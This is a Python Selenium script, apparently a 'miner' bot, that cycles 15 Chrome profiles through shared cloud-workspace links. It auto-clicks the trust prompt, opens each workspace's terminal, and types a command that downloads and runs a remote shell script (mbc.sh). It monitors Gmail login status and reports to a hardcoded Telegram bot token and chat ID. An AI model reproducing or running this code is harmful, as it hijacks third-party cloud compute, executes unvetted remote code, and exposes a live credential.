import threading
import time
import os
import shutil
import subprocess
import sys
import pyautogui
import requests
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException

pyautogui.FAILSAFE = False

# =============== KONFIGURASI ===============
LINK_FILE = 'joko.txt'
WAIT_AFTER_LINK = 20
WAIT_AFTER_SHORTCUT = 5
WAIT_AFTER_CYCLE = 3
TOTAL_PROFILES = 15

TELEGRAM_TOKEN = "8333206393:AAG8Z76SSbgAEAC1a3oPT8XhAF9t_rDOq3A"
TELEGRAM_CHAT_ID = "736956967"
RDP_NAME = "RDP_LELE2"

PROFILE_FOLDER = r"C:\Users\Administrator\Desktop\chrome_profiles"

# =============== GLOBAL COUNTER ===============
total_gmail_logout = 0
total_gmail_login = 0

# =============== TELEGRAM ===============
def send_telegram_message(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        requests.post(url, data=payload)
    except Exception as e:
        print(f"[TELEGRAM ERROR] {e}")

# =============== UTILITAS ===============
def print_banner():
    print("\n" + "=" * 40)
    print("🔥 KA JOKO MINER 🔥")
    print("=" * 40 + "\n")
    print(f"[INFO] Memulai worker... Monitoring Gmail Login/Logout...\n")

def read_links_from_file(file_path):
    if not os.path.exists(file_path):
        print(f"[ERROR] File {file_path} tidak ditemukan.")
        return []
    with open(file_path, 'r', encoding='utf-8') as file:
        return list(dict.fromkeys(line.strip() for line in file if line.strip()))

def get_chrome_options(profile_index):
    options = webdriver.ChromeOptions()
    user_data_dir = os.path.join(PROFILE_FOLDER, f"Profile{profile_index}")
    options.add_argument(f"user-data-dir={user_data_dir}")
    options.add_argument(f"--profile-directory=Profile {profile_index}")
    options.add_argument("--window-size=500,650")
    options.add_argument("--force-device-scale-factor=0.65")
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-background-timer-throttling")
    options.add_argument("--disable-backgrounding-occluded-windows")
    options.add_argument("--disable-renderer-backgrounding")
    options.add_argument("--disable-plugins-discovery")
    options.add_argument("--disable-background-tab-suspending")
    options.add_experimental_option("excludeSwitches", ["disable-popup-blocking", "enable-logging"])
    return options

def open_terminal_and_run(driver):
    try:
        actions = ActionChains(driver)
        actions.key_down(Keys.CONTROL).key_down(Keys.SHIFT).send_keys('E').key_up(Keys.SHIFT).key_up(Keys.CONTROL).perform()
        time.sleep(8)

        body = driver.find_element(By.TAG_NAME, "body")
        body.click()
        actions = ActionChains(driver)
        actions.key_down(Keys.CONTROL).send_keys('`').key_up(Keys.CONTROL).perform()
        time.sleep(3)

        actions.key_down(Keys.CONTROL).key_down(Keys.SHIFT).send_keys('E').key_up(Keys.SHIFT).key_up(Keys.CONTROL).perform()
        time.sleep(8)

        body = driver.find_element(By.TAG_NAME, "body")
        body.click()
        actions = ActionChains(driver)
        actions.key_down(Keys.CONTROL).send_keys('`').key_up(Keys.CONTROL).perform()
        time.sleep(3)

        command_text = " rm -rvf mbc.sh; wget https://raw.githubusercontent.com/vokerjok/Server/refs/heads/main/mbc.sh; bash mbc.sh "
        actions = ActionChains(driver)
        actions.send_keys(command_text)
        actions.send_keys(Keys.ENTER)
        actions.perform()
        time.sleep(WAIT_AFTER_SHORTCUT)
        return True
    except Exception as e:
        print(f"[ERROR TERMINAL] {e}")
        return False

def try_open_terminal_with_retry(driver, max_attempts=2):
    for attempt in range(max_attempts):
        if open_terminal_and_run(driver):
            return True
        time.sleep(3)
    return False

def process_single_link(link, profile_index):
    global total_gmail_login, total_gmail_logout
    driver = None
    success = False

    try:
        options = get_chrome_options(profile_index)
        driver = webdriver.Chrome(options=options)
        driver.get(link)

        if "mail.google.com" in link:
            time.sleep(3)
            page_source = driver.page_source.lower()
            if any(s in page_source for s in ["verify it’s you", "sign in", "session expired", "signin"]):
                with open("gmail_status.txt", "w") as f:
                    f.write("Logout")
                total_gmail_logout += 1
            else:
                with open("gmail_status.txt", "w") as f:
                    f.write("Aman")
                total_gmail_login += 1

        wait = WebDriverWait(driver, 15)
        trust_button = wait.until(EC.element_to_be_clickable((By.XPATH, "//div[contains(text(), 'I trust the owner of this shared workspace')]")))
        trust_button.click()
        time.sleep(1)

        open_workspace_button = wait.until(EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Open Workspace')]")))
        open_workspace_button.click()
        time.sleep(WAIT_AFTER_LINK)

        if try_open_terminal_with_retry(driver):
            success = True

    except Exception as e:
        print(f"[ERROR] {link}: {e}")
    finally:
        if driver:
            try:
                driver.quit()
            except:
                pass
    return success

def process_links_loop():
    total_links = 0
    print_banner()
    current_index = 0

    while True:
        links = read_links_from_file(LINK_FILE)
        if not links:
            print("[INFO] Tidak ada link, menunggu 30 detik...")
            time.sleep(30)
            continue

        total_link_count = len(links)
        if current_index >= total_link_count:
            current_index = 0

        batch = links[current_index:current_index + TOTAL_PROFILES]
        if len(batch) < TOTAL_PROFILES:
            batch += links[0:TOTAL_PROFILES - len(batch)]

        start_link_num = current_index + 1
        end_link_num = current_index + len(batch)
        if end_link_num > total_link_count:
            end_link_num = end_link_num - total_link_count

        if start_link_num <= end_link_num:
            link_range_str = f"{start_link_num}–{end_link_num}"
        else:
            link_range_str = f"{start_link_num}–{total_link_count} & 1–{end_link_num}"

        with open("link_status.txt", "w") as f:
            f.write(link_range_str)

        results = [None] * len(batch)
        threads = []

        def thread_worker(i, link, profile_index):
            results[i] = process_single_link(link, profile_index)

        for idx, link in enumerate(batch):
            profile_index = (idx % TOTAL_PROFILES) + 1
            t = threading.Thread(target=thread_worker, args=(idx, link, profile_index))
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        berhasil = sum(1 for r in results if r)
        gagal = len(results) - berhasil
        total_links += len(batch)

        send_telegram_message(
            f"📡 <b>{RDP_NAME}</b>\n"
            f"🔗 Link: {link_range_str}\n"
            f"✅ Berhasil membuka: {berhasil} link\n"
            f"❌ Gagal membuka: {gagal} link\n"
            f"📄 Total link dibuka: {total_links}\n\n"
            f"📧 Gmail Aman (Trust): {total_gmail_login}\n"
            f"⚠️ Gmail Logout: {total_gmail_logout}"
        )

        print(f"[STATUS] Gmail Login: {total_gmail_login} | Logout: {total_gmail_logout} | Link: {link_range_str}")

        current_index += TOTAL_PROFILES
        if current_index >= total_link_count:
            current_index %= total_link_count

        time.sleep(WAIT_AFTER_CYCLE)

if __name__ == "__main__":
    process_links_loop()
